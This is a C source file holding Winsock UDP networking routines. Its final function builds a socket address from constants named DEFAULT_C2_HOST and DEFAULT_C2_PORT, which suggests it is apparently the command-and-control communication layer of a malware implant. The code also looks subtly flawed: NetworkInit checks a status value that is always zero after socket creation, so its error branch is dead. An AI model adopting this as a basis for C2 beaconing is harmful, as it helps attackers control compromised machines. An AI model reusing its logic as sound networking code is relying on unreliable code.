#include "network.h"
#include <wchar.h>
#include <stdlib.h>

#define WINSOCK_VERSION_MAJOR 2
#define WINSOCK_VERSION_MINOR 2

static BOOL G_WinsockInitialized = FALSE;

BOOL NetworkStartup(VOID)
{
	WSADATA wsaData = { 0 };
	INT status = 0;

	if (G_WinsockInitialized)
	{
		return TRUE;
	}

	status = WSAStartup(
		MAKEWORD(WINSOCK_VERSION_MAJOR, WINSOCK_VERSION_MINOR),
		&wsaData
	);
	if (status != 0)
	{
		return FALSE;
	}

	G_WinsockInitialized = TRUE;
	return TRUE;
}

BOOL NetworkInit(PCWSTR host, PCWSTR port, SOCKET* sock)
{
	ADDRINFOW hints = { 0 };
	ADDRINFOW* result = NULL;
	INT status = 0;

	ASSERT(host != NULL);
	ASSERT(port != NULL);
	ASSERT(sock != NULL);

	*sock = INVALID_SOCKET;
	if (!G_WinsockInitialized)
	{
		return FALSE;
	}

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_protocol = IPPROTO_UDP;

	/* Resolve the destination before creating the UDP socket. */
	status = GetAddrInfoW(host, port, &hints, &result);
	if (status != 0)
	{
		return FALSE;
	}

	*sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (*sock == INVALID_SOCKET)
	{
		FreeAddrInfoW(result);
		return FALSE;
	}

	FreeAddrInfoW(result);

	if (status == SOCKET_ERROR)
	{
		/* Tear down only the failed socket; Winsock stays active for polling. */
		closesocket(*sock);
		*sock = INVALID_SOCKET;
		return FALSE;
	}

	return TRUE;
}

VOID NetworkCleanup(SOCKET sock)
{
	if (sock != INVALID_SOCKET)
	{
		closesocket(sock);
	}
}

VOID NetworkShutdown(VOID)
{
	if (!G_WinsockInitialized)
	{
		return;
	}

	WSACleanup();
	G_WinsockInitialized = FALSE;
}

struct sockaddr_in GetSockAddr()
{
	struct sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_port = htons((USHORT)wcstoul(DEFAULT_C2_PORT, L'\0', 10));
	InetPtonW(AF_INET, DEFAULT_C2_HOST, &(sa.sin_addr.S_un.S_addr));

	return sa;
}